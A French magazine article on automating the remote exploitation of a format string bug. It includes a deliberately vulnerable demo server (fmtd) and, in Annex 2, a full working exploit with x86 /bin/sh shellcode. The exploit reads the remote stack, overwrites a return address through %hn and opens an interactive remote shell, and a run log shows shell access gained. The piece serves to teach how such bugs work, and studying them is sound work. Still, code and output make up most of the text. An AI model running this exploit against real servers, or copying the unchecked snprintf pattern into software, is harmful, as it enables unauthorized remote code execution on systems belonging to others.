	 Exploitation distante et automatique d'un bogue de format

         	    Frédéric Raynal <pappy@miscmag.com>


  Attention : cet article est la propriété de MISC (http://www.miscmag.com).
    Vous n'êtes pas autorisés à le reproduire à moins de demander
    préalablement l'autorisation et de préciser l'auteur (moi ;-) et
    MISC (en tant que propriétaire légitime.
    J'ai écrit cet article pour MISC, et je les remercie de
    m'autoriser à le reproduire ici.

L'exploitation à distance d'un bogue de format est un exercice assez
amusant. Il permet en outre de bien saisir l'étendue des risques
présentés par ces bogues. Nous ne reviendrons pas dans cet article sur
les bogues de format (origine du problème et construction de la chaîne
de format) : la littérature sur le sujet commence à être suffisamment
abondante et le lecteur pourra se référer aux articles cités dans la
bibliographie.


--[  1. Contexte : le serveur vulnérable  ]--

Un serveur très simple (mais néanmoins pédagogique) nous accompagnera
tout au long de ce document. Il demande la saisie tout d'abord d'un
login puis d'un mot de passe. Ensuite, il reproduit l'entrée standard
sur la sortie standard. Ses sources sont disponibles en annexe 1.


Pour installer notre serveur fmtd, nous configurons inetd pour qu'il
autorise les connexions TCP vers le port 12345 :

# /etc/inetd.conf
12345  stream  tcp  nowait  raynal  /home/raynal/MISC/2-MISC/RemoteFMT/fmtd

Ou, si vous utilisez xinetd :

# /etc/xinetd.conf

service fmtd
{
  type        = UNLISTED
  user        = raynal
  group       = users
  socket_type = stream
  protocol    = tcp
  wait        = no
  server      = /tmp/fmtd
  port        = 12345
  only_from   = 192.168.1.1 192.168.1.2 127.0.0.1
}

Relancer le serveur considéré. N'oublier pas non plus de configurer un
éventuel pare-feu pour qu'il ne bloque pas le port voulu.

Maintenant que tout est en place, voyons comment fonctionne notre
démon :

$ telnet bosley 12345
Trying 192.168.1.2...
Connected to bosley.
Escape character is '^]'.
login: raynal
password: secret
hello world
hello world
^]

telnet> quit
Connection closed.

Notre démon génère des traces des le fichier de logs :

Jan  4 10:49:09 bosley fmtd[877]: login -> read login [raynal^M ] (8) bytes
Jan  4 10:49:14 bosley fmtd[877]: passwd -> read passwd [bffff9d0] (8) bytes
Jan  4 10:49:56 bosley fmtd[877]: vul() -> error while reading input buf [] (0)
Jan  4 10:49:56 bosley inetd[407]: pid 877: exit status 255

Lors de la session précédente, nous avons simplement saisi une paire
login / mot de passe, une entrée puis nous nous sommes déconnectés.
Regardons ce qui se passe lorsque nous lui passons des instructions de
formatage :

telnet bosley 12345
Trying 192.168.1.2...
Connected to bosley.
Escape character is '^]'.
login: raynal
password: secret
%x %x %x %x
d 25207825 78252078 d782520

Les instructions "%x %x %x %x" étant exécutées, notre serveur est donc
vulnérable à un bogue de format.

<hors-sujet>
    En fait, tous les programmes qui réagissent de cette manière ne sont
    pas nécessairement exploitables comme des bogues de format :

          int main( int argc, char ** argv ) 
          {
            char buf[8];
            sprintf( buf, argv[1] );
          }
      

    Tenter d'exploiter ce programme avec des %hn conduit à un
    débordement de buffer : la chaîne formatée par argv[1] s'accroît,
    mais comme aucun contrôle sur la taille n'est réalisé, le buffer
    déborde et le programme plante.
</hors-sujet>

En examinant les sources, la vulnérabilité est localisée dans la
fonction vul() :

  ...
  snprintf(tmp, sizeof(tmp)-1, buf);
  ...

Le buffer buf est celui directement fourni par l'utilisateur. Nous
sommes donc à même de le contrôler complètement, tout comme le serveur
sur lequel le démon fonctionne.


--[  2. Les paramètres  ]--

Tout comme lors de l'exploitation locale d'un bogue de format, les mêmes
paramètres sont nécessaires :

    * le décalage (ou offset) pour atteindre le début du buffer ;
    * l'adresse du shellcode dans la pile du serveur ;
    * l'adresse du buffer vulnérable ;
    * une adresse de retour.

Le code de l'exploit est disponible en annexe 2 <#annexe2>. Nous
reprenons dans la suite de cet article les variables définies dans le
programme :

    * sd : la socket entre le client (i.e. l'exploit) et le serveur
      vulnérable ;
    * buf : un buffer servant à lire/écrire des données ;
    * read_at : une adresse dans la pile du serveur ;
    * fmt : la chaîne de format envoyée au serveur.


  --[  2.1 L'offset  ]--

Paramètre dont nous avons toujours besoin pour exploiter un tel bogue,
sa détermination est identique à celle effectuée en locale :

telnet bosley 12345
Trying 192.168.1.2...
Connected to bosley.
Escape character is '^]'.
login: raynal
password: secret
AAAA%1$x
AAAAa
AAAA%2$x
AAAA41414141

Dans cet exemple, l'offset vaut donc 2. Il est facile d'automatiser
cette étape en testant différentes valeurs. C'est le rôle de la
fonction get_offset() qui envoie la chaîne "AAAA%<val>$x" au
serveur. Si l'offset vaut bien val, le serveur répond avec la chaîne
"AAAA41414141" :

  #define MAXOFFSET 255

  for (i = 1; i<MAX_OFFSET && offset == -1; i++) {

    snprintf(fmt, sizeof(fmt), "AAAA%%%d$x", i);
    write(sock, fmt, strlen(fmt));
    memset(buf, 0, sizeof(buf));
    sleep(1);
    read(sock, buf, sizeof(buf))
    if (!strcmp(buf, "AAAA41414141"))
      offset = i;
  }


  --[  2.2 Localisation du shellcode en mémoire  ]--

D'une manière ou d'une autre, il faut placer le shellcode en
mémoire. Il se situe soit dans le buffer vulnérable, soit dans un
autre, ceci ne revêt aucune importance grâce au bogue de format. Par
exemple, dans le cas d'une exploitation d'un serveur ftp, le mot de
passe (PASS) permet facilement d'injecter le shellcode dans la mémoire
du serveur, sans aucune vérification s'il s'agit des comptes anonymous
ou ftp. Nous avons repris cela dans la version de notre serveur.


    -- --[  Transformer un bogue de format en déboggeur  ]-- --

La première étape est de déterminer l'adresse du shellcode sur le
serveur. Pour cela, nous profitons de l'aubaine que constitue un bogue
de format : on transforme le processus distant en déboggeur !

En effet, en plaçant une instruction de formatage "%s", le programme
lit en mémoire jusqu'à ce que le buffer soit rempli ou bien qu'un
caractère NULL soit rencontré. En envoyant successivement des "%s" au
serveur, le programme client explore donc complètement la pile du
processus associé :

	  <addr>%<offset>$s

Dans le code de notre exploit, cette opération est réalisé en deux
étapes :

   1. l'appel à la fonction get_addr_as_char(u_int addr, char *buf)
      convertit addr en char :
         *(u_int*)buf = addr; 
      Au cas où un des octets serait nul, on y ajoute 1 ;

   2. ensuite, les quatre octets suivants contiennent l'instruction de
      formatage.

La chaîne ainsi construite est expédiée au serveur :

  get_addr_as_char(read_at, fmt);
  snprintf(fmt+4, sizeof(fmt)-4, "%%%d$s", offset);
  write(sd, fmt, strlen(fmt));

On lit à l'adresse <addr> une chaîne de caractères. Si celle-ci ne
contient pas le shellcode, la prochaine lecture est effectuée à
l'adresse <addr>, à laquelle il faut ajouter le nombre d'octets lus
(i.e. la valeur de retour de la fonction read()).

Cependant, parmi les len caractères reçus, tous ne sont pas à
comptabiliser. L'instruction qui pose un problème sur le serveur est
de la forme :

  sprintf(out, in); 

Nous avons détaillé le contenu du buffer d'entrée in. Pour construire
le buffer de sortie, la fonction sprintf() commence par parcourir
in. Les quatre premiers octets correspondent à l'adresse lue : ils
sont recopiés à l'identique dans le buffer de sortie out. Ensuite
seulement, l'instruction de formatage est interprétée. Nous devons
donc retirer ces quatre octets :

  while( (len = read(sd, buf, sizeof(buf))) > 0) {
    [ ... ]
    read_at += (len-4+1);
    [ ... ]
  }


    -- --[  Que chercher ?  ]-- --

En fait, le premier problème qui se pose est comment identifier le
shellcode ? Si on recherche l'intégralité des octets du shellcode, on
risque de ne pas le trouver. En effet, le buffer est suivi d'un
caractère NULL et la chaîne qui le précède peut contenir plus ou moins
de NOPs. Par conséquent, le shellcode risque d'être partagé sur deux
lectures.

Pour éviter ce désagrément, dans le cas où le nombre d'octets lus est
égal à la taille du buffer, on « oublie » les derniers
sizeof(shellcode) octets lus et on regarde à l'adresse prévue, moins
cette même valeur :

  while( (len = read(sd, buf, sizeof(buf))) > 0) {
    [ ... ]
    read_at += len;
    if (len == sizeof(buf))
      read_at-=strlen(shellcode);
    [ ... ]
  }

En toute honnêteté, ce cas de figure n'a pu être testé, et je ne
garanti donc absolument pas que ça fonctionne ;-/


    -- --[  Détermination de l'adresse exacte du shellcode  ]-- --

La recherche d'un motif dans une chaîne est effectuée par
l'instruction :

  ptr = strstr(buf, pattern); 

Celle-ci retourne un pointeur dans la chaîne scannée qui désigne le
premier caractère du motif recherché. La position en mémoire du
shellcode sur le serveur est donc donnée par :

  addr_shellcode = read_at + (ptr-buf); 

Sauf que notre buffer contient des choses qu'il faut aussi
comptabiliser. Comme précédemment pour l'exploration de la pile, le
buffer de sorti contient dès le début quatre octets indiquant
l'adresse lue qu'il faut retirer du comptage :

   addr_shellcode = read_at + (ptr-buf) - 4; 


    -- --[  shellcode : le résumé  ]-- --

Un bout de code valant parfois mieux qu'un long discours :

  while( (len = read(sd, buf, sizeof(buf))) > 0) {
    if ((ptr = strstr(buf, shellcode))) {
      addr_shellcode = read_at + (ptr-buf) - 4;
      break;
    }
    read_at += (len-4+1);
    if (len == sizeof(buf)) {
      read_at-=strlen(shellcode);
    }
    memset (buf, 0x0, sizeof (buf));
    get_addr_as_char(read_at, fmt);
    write(sd, fmt, strlen(fmt));
  }


--[  2.3 Le problème de l'adresse de retour  ]--

Il nous reste un dernier paramètre à considérer : l'adresse de retour.
En effet, si nous connaissons l'offset et la position du shellcode en
mémoire, il nous faut encore déterminer une adresse de retour valide
dans la pile pour la remplacer par celle du shellcode.

Nous ne reviendrons pas ici en détails sur les mécanismes qui
régissent l'appel des fonctions, rappelons uniquement l'empilement des
paramètres et variables locales lors de l'appel d'une fonction. Les
arguments sont placés dans la pile du dernier au premier. Ensuite, le
registre d'instructions est sauvegardé (%eip), ainsi que le registre
%ebp qui marque le début de la mémoire pour la fonction appelée. A
partir de cette adresse, de l'espace mémoire est réservé pour les
variables locales de la fonction. Lorsque la fonction est terminée, le
registre d'instructions est dépilé et le ménage fait dans la pile
Attention, cela signifie simplement que les registres %esp et %ebp
sont repositionnés en fonction du contexte de la fonction
appelante. En aucun cas la mémoire n'est nettoyée d'une quelconque
façon.


Notre but est donc maintenant de parvenir à déterminer une adresse de
retour, c'est-à-dire la position d'un registre %eip sauvegardé dans la
pile. Nous effectuons cette opération en deux étapes :

   1. détermination de l'adresse du buffer d'entrée
   2. détermination de l'adresse de retour sauvegardée pour la fonction
      où se situe le buffer vulnérable.

Pourquoi rechercher l'adresse du buffer ? Toutes les paires (saved
ebp, saved eip) que nous pouvons trouver dans la pile ne conviennent
pas. La pile n'est pas « nettoyée » entre chaque appel de
fonction. Elle contient donc des résidus des appels précédents, mais
qui ne sont pas réellement dans la mémoire utilisée par le processus.

Pour remédier à cela, il nous faut déterminer l'adresse du buffer
d'entrée. En effet, il est au sommet de la pile. Toute paire qui se
situe au dessus dans la pile nous convient.


        Détermination de l'adresse du buffer

Le buffer d'entrée qui nous permet de passer les instructions de
formatage au buffer vulnérable est facilement identifiable dans la
mémoire du serveur : il joue le rôle d'un miroir par rapport aux
instructions que nous lui passons. En effet, notre serveur fmtd les
recopie sans les modifier (ATTENTION: si des caractères étaient placés
dans la réponse du serveur, ils devraient être pris en considération
dans ce qui suit).

Nous cherchons donc maintenant l'adresse où se situe l'instruction de
formatage à l'identique que nous passons au serveur :

  while((len = read(sd, buf, sizeof(buf))) > 0) {
    if ((ptr = strstr(buf, fmt))) {
      addr_buffer = read_at + (ptr-buf) - 4;
      break;
    }
    read_at += (len-4+1);
    memset (buf, 0x0, sizeof (buf));
    get_addr_as_char(read_at, fmt);
    write(sd, fmt, strlen(fmt));
  }


    -- --[  Détermination de l'adresse de retour  ]-- --

En général, le sommet de la pile possède l'adresse 0xc0000000
(signalons tout de même que ce n'est pas le cas sur la distribution
Caldera où le sommet de la pile est en 0x80000000 si quelqu'un peut
m'expliquer pourquoi ?)

La place réservée dans la pile dépend alors des besoins du programme,
c'est-à-dire des variables locales. Souvent, celles-ci sont situées
dans les adresses 0xbfffXXXX, où XX représente un octet
indéterminé. Au contraire, les instructions d'un programme (la section
.text) sont chargées à partir de 0x08048000.

Nous devons donc lire la pile distante pour trouver une paire (saved
ebp, saved eip) de la forme :

                       Sommet de la pile
                         0x0804XXXX
                         0xbfffXXXX

soit, puisque les adresses sont stockées en /little endian/, la chaîne
0xff 0xbf XX XX 0x04 0x08. Comme nous l'avons déjà vu, la chaîne
retournée par le serveur commence toujours par les quatre octets de
l'adresse lue. Il n'est donc pas nécessaire de les considérer dans la
recherche du motif qui nous intéresse :

    i = 4;
    while (i<len-5 && addr_ret == -1) {
      if (buf[i] == (char)0xff && buf[i+1] == (char)0xbf &&
	  buf[i+4] == (char)0x04 && buf[i+5] == (char)0x08) {
	addr_ret = read_at + i - 2 + 4 - 4;
	fprintf (stderr, "[ret addr is: 0x%x (%d) ]\n", addr_ret, len);
      }
      i++;
    }
    if (addr_ret != -1) break;

La variable addr_ret est initialisé selon une formule savante :

    * addr_ret : l'adresse à laquelle on vient de lire ;
    * +i : le décalage dans la chaîne où nous recherchons dans le
      motif (nous ne pouvons pas employer la fonction strstr() comme
      précédemment car le motif comporte des « trous » - au milieu - les
      octets XX) ;
    * -2 : les premiers octets que nous repérons dans la pile sont ff
      bf, mais le mot complet (/i.e./ la sauvegarde du registre %ebp)
      tient sur quatre octet. Le -2 comptabilise donc les deux octets
      de poids faible situé au début du mot (XX XX ff bf) ;
    * +4 : cette modification est dûe au placement de l'adresse de
      retour qui se situe quatre octets au-dessus de la sauvegarde du
      registre %ebp ;
    * -4 : comme toujours, les quatre premiers octets du buffer lu
      contiennent l'adresse à laquelle on vient de lire, et on les
      ignore donc.


--[  3. L'exploitation  ]--

Maintenant que tous les paramètres sont réunis, l'exploitation ne
présente plus aucune difficulté. Il suffit en effet de remplacer
l'adresse de retour (addr_ret) par celle du shellcode
(addr_shellcode). La fonction build_hn est issue de fmtbuilder [5] et
construit la chaîne de format désirée qui est ensuite envoyée au
serveur :

  build_hn(buf, addr_ret, addr_shellcode, offset, 0);
  write(sd, buf, strlen(buf));

Une fois ce remplacement effectué dans la pile du serveur, il nous
reste à sortir de la fonction vul(). Nous envoyons alors la commande
quit (gentiment) prévu à cet effet :

  strcpy(buf, "quit");
  write(sd, buf, strlen(buf));

Enfin, la fonction interact() manipule les descripteurs de fichiers
pour que le shell obtenu soit interactif.

Dans l'exemple suivant, l'exploit est lancé depuis bosley sur charly :

$ ./expl-fmtd -i 192.168.1.1 -a 0xbfffed01
Using IP 192.168.1.1
Connected to 192.168.1.1
login sent [toto] (4)
passwd (shellcode) sent (10)
[Found offset = 6]
[buffer addr is: 0xbfffede0 (12) ]
buf = (12)
e0 ed ff bf e0 ed ff bf 25 36 24 73 

[shell addr is: 0xbffff5f0 (60) ]
buf = (60)
e5 f5 ff bf 8b 04 08 28 fa ff bf 22 89 04 08 eb 1f 5e 89 76 08 
31 c0 88 46 07 89 46 0c b0 0b 89 f3 8d 4e 08 8d 56 0c cd 80 
31 db 89 d8 40 cd 80 e8 dc ff ff ff 2f 62 69 6e 2f 73 68 
[ret addr is: 0xbffff5ec (60) ]
Building format string ...
Sending the quit ...
bye bye ...
Linux charly 2.4.17 #1 Mon Dec 31 09:40:49 CET 2001 i686 unknown
uid=500(raynal) gid=100(users)
exit
$


--[  4. Conclusion  ]--

Les bogues de format sont de plus en plus rares, et heureusement, car
ils constituent un risque énorme. L'automatisation de l'exploitation
de ces bogues n'est pas très compliquée comme nous venons de le voir
dans cet article. La bibliothèque fmtbuilder (voir [5]) fournit déjà
les outils adéquates, et d'autres existent probablement.

Il est possible de modifier la structure de l'exploit en supprimant un
paramètre. Ici, nous avons opté pour explorer la pile de manière
croissante. Si l'adresse utilisée pour initialiser la variable read_at
(qui pointe sur l'adresse à laquelle on commence à lire dans la pile)
est trop basse, l'exploit risque de tomber dans une zone où il n'a pas
le droit de lire, ce qui provoque un segfault. De même, si cette
adresse est trop haute, l'exploit ne trouve pas certains paramètres et
échoue également.

L'autre solution est donc d'explorer la pile en descendant. Il faut
initialiser la variable addr_stack à l'adresse du sommet de la pile
0xc0000000-4 (l'adresse (0xc0000000 n'est pas lisible). Il faut
également remplacer la ligne read_at+=(len-4+1); par read_at-=4;. De
cette manière, il n'est plus besoin de fournir une valeur pour
l'argument "-a". L'inconvénient de cette approche est que l'adresse de
retour se situe alors sous le buffer d'entrée. Or, tout ce qui se
trouve sous l'adresse du buffer vulnérable provient de fonctions
appelées depuis la fonction qui abrite ce buffer. Donc, ces données
sont assez peu fiables car elles ne sont pas dans une zone marquée
libre dans la pile, et donc susceptible d'être écrasée lors de l'appel
d'une autre fonction.

------------------------------------------------------------------------


--[ Annexe 1 : le serveur fmtd ]--

#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdarg.h>
#include <syslog.h>

void respond(char *fmt,...);

int vul(void)
{
  char tmp[1024];
  char buf[1024];
  int len = 0;

  syslog(LOG_ERR, "vul() -> tmp = 0x%x buf = 0x%x\n", tmp, buf); 

  while(1) {

    memset(buf, 0, sizeof(buf));
    memset(tmp, 0, sizeof(tmp));
    if ( (len = read(0, buf, sizeof(buf))) <= 0 ) {
      syslog(LOG_ERR, "vul() -> error while reading input buf [%s] (%d)",
	     buf, len);
      exit(-1);
    } /*
	else
	syslog(LOG_INFO, "vul() -> read %d bytes", len);
      */
    if (!strncmp(buf, "quit", 4)) {
      respond("bye bye ...\n");
      return 0;
    }
    snprintf(tmp, sizeof(tmp)-1, buf);
    respond("%s", tmp);

  }
}

void respond(char *fmt,...)
{
  va_list va;
  char buf[1024];
  int len = 0;

  va_start(va,fmt);
  vsnprintf(buf,sizeof(buf),fmt,va);
  va_end(va);
  len = write(STDOUT_FILENO,buf,strlen(buf));
  /* syslog(LOG_INFO, "respond() -> write %d bytes", len); */
}


int main()
{
  struct sockaddr_in sin;
  int i,len = sizeof(struct sockaddr_in);
  char login[16];
  char passwd[1024];
  openlog("fmtd", LOG_NDELAY | LOG_PID, LOG_LOCAL0);

  /* get login */
  memset(login, 0, sizeof(login));
  respond("login: ");
  if ( (len = read(0, login, sizeof(login))) <= 0 ) {
    syslog(LOG_ERR, "login -> error while reading login [%s] (%d)",
	   login, len);
    exit(-1);
  } else
    syslog(LOG_INFO, "login -> read login [%s] (%d) bytes", login, len);

  /* get passwd */
  memset(passwd, 0, sizeof(passwd));
  respond("password: ");
  if ( (len = read(0, passwd, sizeof(passwd))) <= 0 ) {
    syslog(LOG_ERR, "passwd -> error while reading passwd [%s] (%d)",
	   passwd, len);
    exit(-1);
  } else
    syslog(LOG_INFO, "passwd -> read passwd [%x] (%d) bytes", passwd, len);

  /* let's run ... */
  vul();
  return 0;
}

------------------------------------------------------------------------


--[ Annexe 2 : l'exploit expl-fmtd  ]--

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <getopt.h>



char verbose = 0, debug = 0;

#define OCT( b0, b1, b2, b3, addr, str ) { \
		b0 = (addr >> 24) & 0xff; \
        	b1 = (addr >> 16) & 0xff; \
        	b2 = (addr >>  8) & 0xff; \
        	b3 = (addr      ) & 0xff; \
                if ( b0 * b1 * b2 * b3 == 0 ) { \
                	printf( "\n%s contains a NUL byte. Leaving...\n", str ); \
                  	exit( EXIT_FAILURE ); \
                } \
	}
#define MAX_FMT_LENGTH 	128 
#define ADD		0x100	
#define FOUR            sizeof( size_t ) * 4
#define TWO             sizeof( size_t ) * 2
#define BANNER "uname -a ; id"
#define MAX_OFFSET 255

int interact(int sock)
{
  fd_set fds;
  ssize_t ssize;
  char buffer[1024];

  write(sock, BANNER"\n", sizeof(BANNER));
  while (1) {
    FD_ZERO(&fds);
    FD_SET(STDIN_FILENO, &fds);
    FD_SET(sock, &fds);
    select(sock + 1, &fds, NULL, NULL, NULL);

    if (FD_ISSET(STDIN_FILENO, &fds)) {
      ssize = read(STDIN_FILENO, buffer, sizeof(buffer));
      if (ssize < 0) {
	return(-1);
      }
      if (ssize == 0) {
	return(0);
      }
      write(sock, buffer, ssize);
    }

    if (FD_ISSET(sock, &fds)) {
      ssize = read(sock, buffer, sizeof(buffer));
      if (ssize < 0) {
	return(-1);
      }
      if (ssize == 0) {
	return(0);
      }
      write(STDOUT_FILENO, buffer, ssize);
    }
  }
  return(-1);
}

u_long resolve(char *host)
{
  struct hostent *he;
  u_long ret;

  if(!(he = gethostbyname(host)))
    {
      herror("gethostbyname()");
      exit(-1);
    }

  memcpy(&ret, he->h_addr, sizeof(he->h_addr));
  return ret;
}
int 
build_hn(char * buf, unsigned int locaddr, unsigned int retaddr, unsigned int offset, unsigned int base)
{
  unsigned char b0, b1, b2, b3;
  unsigned int high, low;
  int start = ((base / (ADD * ADD)) + 1) * ADD * ADD;
  int sz;

  /* <locaddr> : where to overwrite */
  OCT(b0, b1, b2, b3, locaddr, "[ locaddr ]");
  sz = snprintf(buf, TWO + 1,     /* 8 char to have the 2 addresses */
	         "%c%c%c%c"       /* + 1 for the ending \0 */
	         "%c%c%c%c",
	         b3, b2, b1, b0,
	         b3 + 2, b2, b1, b0);
  
  /* where is our shellcode ? */
  OCT(b0, b1, b2, b3, retaddr, "[ retaddr ]");
  high = (retaddr & 0xffff0000) >> 16; 
  low = retaddr & 0x0000ffff;      

  return snprintf(buf + sz, MAX_FMT_LENGTH, 
		   "%%.%hdx%%%d$n%%.%hdx%%%d$hn", 
		   low - TWO + start - base, 
		   offset, 
		   high - low + start, 
		   offset + 1);
}



void get_addr_as_char(u_int addr, char *buf) {

  *(u_int*)buf = addr;
  if (!buf[0]) buf[0]++;
  if (!buf[1]) buf[1]++;
  if (!buf[2]) buf[2]++;
  if (!buf[3]) buf[3]++;
}

int get_offset(int sock) {

  int i, offset = -1, len;
  char fmt[128], buf[128];

  for (i = 1; i<MAX_OFFSET && offset == -1; i++) {

    snprintf(fmt, sizeof(fmt), "AAAA%%%d$x", i);
    write(sock, fmt, strlen(fmt));
    memset(buf, 0, sizeof(buf));
    sleep(1);
    if ((len = read(sock, buf, sizeof(buf))) < 0) {
      fprintf(stderr, "Error while looking for the offset (%d)\n", len);
      close(sock);
      exit(EXIT_FAILURE);
    }

    if (debug) 
      fprintf(stderr, "testing offset = %d fmt =  [%s] buf = [%s] len = %d\n", 
	      i, fmt, buf, len);

    if (!strcmp(buf, "AAAA41414141"))
      offset = i;
  }
  return offset;
}

char *shellcode =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc, char **argv)
{
  char *ip = "127.0.0.1", *ptr;
  struct sockaddr_in sck;
  u_int read_at, addr_stack = (u_int)0xbfffe0001; /* default bottom */
  u_int addr_shellcode = -1, addr_buffer = -1, addr_ret = -1;
  char buf[1024], fmt[128], c;
  int port = 12345, offset = -1;
  int sd, len, i;

  while ((c = getopt(argc, argv, "dvi:p:a:o:")) != -1) {
    switch (c) {
      case 'i':
	ip = optarg;
	break;
	  
      case 'p':
	port = atoi(optarg);
	break;

      case 'a':
	addr_stack = strtoul(optarg, NULL, 16);
	break;
	
      case 'o':
	offset = atoi(optarg);
	break;

      case 'v':
	verbose = 1;
	break;

      case 'd':
	debug = 1;
	break;

      default:
	fprintf(stderr, "Unknwon option %c (%d)\n", c, c);
	exit (EXIT_FAILURE);
    }
  }

  /* init the sockaddr_in */
  fprintf(stderr, "Using IP %s\n", ip);
  sck.sin_family = PF_INET;
  sck.sin_addr.s_addr = resolve(ip);
  sck.sin_port = htons (port);

  /* open the socket */
  if (!(sd = socket (PF_INET, SOCK_STREAM, 0))) {
    perror ("socket()");
    exit (EXIT_FAILURE);
  }
  
  /* connect to the remote server */
  if (connect (sd, (struct sockaddr *) &sck, sizeof (sck)) < 0) {
    perror ("Connect() ");
    exit (EXIT_FAILURE);
  }
  fprintf (stderr, "Connected to %s\n", ip);
  if (debug) sleep(10);

  /* send login */
  memset (buf, 0x0, sizeof(buf));
  len = read(sd, buf, sizeof(buf));
  if (strncmp(buf, "login", 5)) {
    fprintf(stderr, "Error: no login asked [%s] (%d)\n", buf, len);
    close(sd);
    exit(EXIT_FAILURE);
  }
  strcpy(buf, "toto");
  len = write (sd, buf, strlen(buf));
  if (verbose) fprintf(stderr, "login sent [%s] (%d)\n", buf, len);
  sleep(1);

  /* passwd: shellcode in the buffer and in the remote stack */
  len = read(sd, buf, sizeof(buf));
  if (strncmp(buf, "password", 8)) {
    fprintf(stderr, "Error: no password asked [%s] (%d)\n", buf, len);
    close(sd);
    exit(EXIT_FAILURE);
  }
  write (sd, shellcode, strlen(shellcode));
  if (verbose) fprintf (stderr, "passwd (shellcode) sent (%d)\n", len);
  sleep(1);

  /* find offset */
  if (offset == -1) {
    if ((offset = get_offset(sd)) == -1) {
      fprintf(stderr, "Error: can't find offset\n");
      fprintf(stderr, "Please, use the -o arg to specify it.\n");
      close(sd);
      exit(EXIT_FAILURE);
    }
    if (verbose) fprintf(stderr, "[Found offset = %d]\n", offset);
  }

  /* look for the address of the shellcode in the remote stack */
  memset (fmt, 0x0, sizeof(fmt));
  read_at = addr_stack;
  get_addr_as_char(read_at, fmt);
  snprintf(fmt+4, sizeof(fmt)-4, "%%%d$s", offset);
  write(sd, fmt, strlen(fmt));
  sleep(1);

  while((len = read(sd, buf, sizeof(buf))) > 0 && 
	(addr_shellcode == -1 || addr_buffer == -1 || addr_ret == -1) ) {

    if (debug) fprintf(stderr, "Read at 0x%x (%d)\n", read_at, len);

    /* the shellcode */
    if ((ptr = strstr(buf, shellcode))) {
      addr_shellcode = read_at + (ptr-buf) - 4;
      fprintf (stderr, "[shell addr is: 0x%x (%d) ]\n", addr_shellcode, len);
      fprintf(stderr, "buf = (%d)\n", len);
      for (i=0; i<len; i++) {
	fprintf(stderr,"%.2x ", (int)(buf[i] & 0xff));
	if (i && i%20 == 0) fprintf(stderr, "\n");
      }
      fprintf(stderr, "\n");
    }

    /* the input buffer */
    if (addr_buffer == -1 && (ptr = strstr(buf, fmt))) {
      addr_buffer = read_at + (ptr-buf) - 4;
      fprintf (stderr, "[buffer addr is: 0x%x (%d) ]\n", addr_buffer, len);
      fprintf(stderr, "buf = (%d)\n", len);
      for (i=0; i<len; i++) {
	fprintf(stderr,"%.2x ", (int)(buf[i] & 0xff));
	if (i && i%20 == 0) fprintf(stderr, "\n");
      }
      fprintf(stderr, "\n\n");
    }

    /* return address */
    if (addr_buffer != -1) {
      i = 4;
      while (i<len-5 && addr_ret == -1) {
	if (buf[i] == (char)0xff && buf[i+1] == (char)0xbf &&
	    buf[i+4] == (char)0x04 && buf[i+5] == (char)0x08) {
	  addr_ret = read_at + i - 2 + 4 - 4;
	  fprintf (stderr, "[ret addr is: 0x%x (%d) ]\n", addr_ret, len);
	}
	i++;
      }
    }

    read_at += (len-4+1);
    if (len == sizeof(buf)) {
      fprintf(stderr, "Warning: this has not been tested !!!\n");
      fprintf(stderr, "len = %d\nread_at = 0x%x", len, read_at);
      read_at-=strlen(shellcode);
    }
    get_addr_as_char(read_at, fmt);
    write(sd, fmt, strlen(fmt));
  }

  /* send the format string */
  fprintf (stderr, "Building format string ...\n");
  memset(buf, 0, sizeof(buf));
  build_hn(buf, addr_ret, addr_shellcode, offset, 0);
  write(sd, buf, strlen(buf));
  sleep(1);
  read(sd, buf, sizeof(buf));

  /* call the return while quiting */
  fprintf (stderr, "Sending the quit ...\n");
  strcpy(buf, "quit");
  write(sd, buf, strlen(buf));
  sleep(1);

  interact(sd);

  close(sd);
  return 0;
}

------------------------------------------------------------------------


--[  Bibliographie  ]--

   1. More info on format bugs par P. "kalou" Bouchareine 
      (http://www.hert.org/papers/format.html)

   2. Format Bugs: What are they, Where did they come from,... How to
      exploit them par lamagra 
      (lamagra@digibel.org <lamagra@digibel.org>)

   3. Éviter les failles de sécurité dès le développement d'une
      application - 4 : les chaînes de format  par F. Raynal, C.
      Grenier, C. Blaess
      (http://minimum.inria.fr/~raynal/index.php3?page=121 ou
      http://www.linuxfocus.org/Francais/July2001/article191.shtml)

   4. Exploiting the format string vulnerabilities par scut (team TESO)
      (http://www.team-teso.net/articles/formatstring)

   5. fmtbuilder-howto par F. Raynal et S. Dralet 
      (http://minimum.inria.fr/~raynal/index.php3?page=501)


------------------------------------------------------------------------
Frédéric Raynal - <pappy@miscmag.com>
